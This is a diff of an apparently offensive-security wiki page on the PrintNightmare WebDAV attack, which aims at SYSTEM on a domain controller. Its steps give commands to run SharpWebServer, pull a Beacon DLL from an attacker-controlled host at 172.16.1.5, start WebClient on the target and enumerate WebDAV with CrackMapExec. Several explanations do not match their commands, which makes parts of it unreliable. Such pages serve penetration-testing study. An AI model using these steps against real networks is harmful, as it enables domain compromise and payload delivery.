@@ -39,6 +39,8 @@ The PrintNightmare WebDAV attack is a technique used to exploit a vulnerability 
 
 From an offensive standpoint, this attack can be used to gain access to sensitive information or to take control of critical systems. From a technical perspective, this attack relies on a vulnerability in the Windows Print Spooler service and the ability to configure a WebDAV server. From a business perspective, this attack highlights the importance of keeping systems up to date and having proper security measures in place to prevent unauthorized access.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable Windows Print Spooler service
@@ -46,6 +48,8 @@ From an offensive standpoint, this attack can be used to gain access to sensitiv
 1. Ability to configure a WebDAV server
 
 1. Trick a victim machine into connecting to the attacker-controlled WebDAV server
+
+ 
 
 ## Defense
 
@@ -55,19 +59,31 @@ From an offensive standpoint, this attack can be used to gain access to sensitiv
 
 1. Monitor network traffic for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Gain SYSTEM level privileges on a domain controller
 
 1. Escalate privileges and move laterally within the network
 
+ 
+
 # Instructions
 
 1. To use SharpWebServer, run the executable file followed by the required arguments.
 
+ 
+
+
+
 **Code**: [[SharpWebServer.exe port=8888 dir=c:\users\public v]]
 
+
+
 > The 'port' argument specifies the port number that the server will listen on. The 'dir' argument specifies the directory that the server will serve files from. The 'verbose' argument specifies whether the server should output verbose logging information.
+
+
 
 **Command** ([[Start SharpWebServer]]):
 
@@ -75,32 +91,56 @@ From an offensive standpoint, this attack can be used to gain access to sensitiv
 SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
 ```
 
+
+
 2. To configure the WebDav port, please follow these steps:
 1. Open the WebDav configuration file on your server.
 2. Locate the 'Port' field and replace the default value with the desired port number.
 3. Save the changes and restart the WebDav service.
 
+ 
+
+
+
 **Code**: [[@[PORT]]]
+
+
 
 > This command is used to configure the port number for WebDav, which is an alternative to SMB for file sharing. The argument @[PORT] should be replaced with the desired port number. It is important to note that this command should only be used when WebDav is being used instead of SMB.
 
 3. To download the Beacon DLL from a remote server, use the following command:
 
+ 
+
+
+
 **Code**: [[\\172.16.1.5@8888\Downloads\beacon.dll]]
+
+
 
 > The argument 'data' contains the file path to the Beacon DLL on the remote server. The URI hostname should be replaced with the actual hostname of the remote server. The file can then be downloaded and saved locally for further use.
 
 4. To start WebClient service, run the following command:
 
+ 
+
+
+
 **Code**: [[net start webclient]]
 
+
+
 > This command will start the WebClient service on the target machine, which is required for certain types of attacks or exploits. The WebClient service allows applications to access resources on the internet, such as file shares or web pages, using the HTTP or HTTPS protocols. Without this service running, some attacks may not be possible or may fail to execute properly.
+
+
 
 **Command** ([[Start WebClient Service]]):
 
 ```bash
 net start webclient
 ```
+
+
 
 5. This command is used to enumerate WebDAV shares on a target machine.
 
@@ -110,7 +150,13 @@ net start webclient
 -M: Specifies the module to use, in this case 'webdav'.
 [TARGET]: Specifies the target machine to enumerate WebDAV shares on.
 
+ 
+
+
+
 **Code**: [[cme smb -u user -p password -d domain.local -M web]]
+
+
 
 > The 'cme smb' command is part of the CrackMapExec (CME) tool, which is used for penetration testing and security assessments. The 'webdav' module is used to enumerate WebDAV shares on a target machine, which can be useful for identifying potential attack vectors. The '-u', '-p', and '-d' options are used to specify the credentials to authenticate with, and the '[TARGET]' argument is used to specify the target machine to enumerate shares on. This command can be used to gather information about a target network and identify potential vulnerabilities.
 
@@ -140,3 +186,5 @@ net start webclient
 - [[Active Directory Attacks]]
 - [[From CVE to SYSTEM shell on DC]]
 - [[PrintNightmare]]
+
+
